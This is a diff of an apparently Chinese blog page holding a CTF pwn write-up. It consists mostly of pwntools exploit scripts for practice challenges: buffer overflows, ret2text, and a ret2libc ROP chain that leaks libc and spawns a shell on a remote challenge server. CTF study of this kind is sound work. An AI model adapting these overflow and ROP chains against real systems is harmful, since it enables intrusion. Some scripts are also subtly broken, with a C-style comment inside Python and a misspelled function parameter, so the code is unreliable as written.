@@ -368,7 +368,7 @@ else:
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    214
+                    397
                 </div>
                 
 
@@ -430,8 +430,9 @@ r.sendline(payload)
 r.interactive()
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<ol start="3">
-<li><p>cisn_2019_n_1</p>
+
+
+<p>3.cisn_2019_n_1</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 context(os='linux',arch='amd64',log_level='debug')
 elf=ELF("./ciscn")
@@ -444,10 +445,11 @@ v2=0x41348000 //11.28125的十六进制形式
 payload = b'a'*(0x30-0x04)+p64(v2)
 r.sendline(payload)
 r.interactive()
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-</ol>
-</li>
-<li><p>pwn1_sctf_2016</p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>4.pwn1_sctf_2016</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 log_level = 'debug'
 elf = ELF("./pwn1_sctf")
@@ -462,8 +464,11 @@ get_flag = 0x08048F0D
 payload = b'I'*20 + b'a'*4 + p32(get_flag)
 r.sendline(payload)
 
-r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
-<li><p>level0</p>
+r.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>5.level0</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
 context(os = 'linux',arch = 'amd64',log_level = 'debug')
 elf = ELF("./level0")
@@ -480,7 +485,77 @@ payload = b'a'*0x80+p64(0)+p64(call_system)
 r.sendline(payload)
 
 r.interactive()
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>6.ciscn_2019_c_1</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *
+context(os= 'linux',arch='amd64',log_level='debug')
+elf=ELF("./ciscn_2019")
+local = 0
+
+if local:
+    r = process("./ciscn_2019")
+else:
+    r = remote("node4.buuoj.cn",29853)
+
+
+def encrypt(paylaod):
+    l = list(payload)
+    for i in range(len(l)):
+        if l[i].isdigit():
+            l[i] = chr(ord(l[i])^0xF)
+        if l[i].isupper():
+            l[i] = chr(ord(l[i])^0xE)
+        if l[i].islower():
+            l[i] = chr(ord(l[i])^0xD)
+   
+    return ''.join(l)
+    
+         
+pop_rdi = 0x0000000000400c83
+pop_ret = 0x00000000004006b9
+main_addr = 0x0000000000400B28
+put_plt = elf.plt['puts']
+put_got = elf.got['puts']
+
+r.recv()
+r.sendline("1")
+
+r.recvuntil("encrypted")
+payload = b'1'*(0x50+8) + p64(pop_rdi) + p64(put_got) + p64(put_plt) + p64(main_addr)
+
+payload = encrypt(payload)
+r.sendline(payload)
+
+r.recvuntil("Ciphertext\n")
+r.recvuntil("\n")
+
+puts_addr = u64(r.recvline()[:-1].ljust(8,'\x00'))
+
+log.success('puts_addr='+hex(puts_addr))
+
+puts_offset = 0x0809c0
+
+libc_base = puts_addr - puts_offset
+
+log.success('libc_base'+hex(libc_base))
+r.sendlineafter("choice!","1")
+
+system_offset = 0x04f440
+bin_sh_offset = 0x1b3e9a
+
+sys_addr = libc_base + system_offset
+bin_sh = libc_base + bin_sh_offset
+
+payload1 = b'a'*(0x50+0x8) + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)
+
+r.sendline(payload1)
+
+r.interactive()
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 </ol>
 
                 
@@ -926,7 +1001,7 @@ r.interactive()
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">2.2k</span>
+                        class="white-color">3.8k</span>
             
             
             
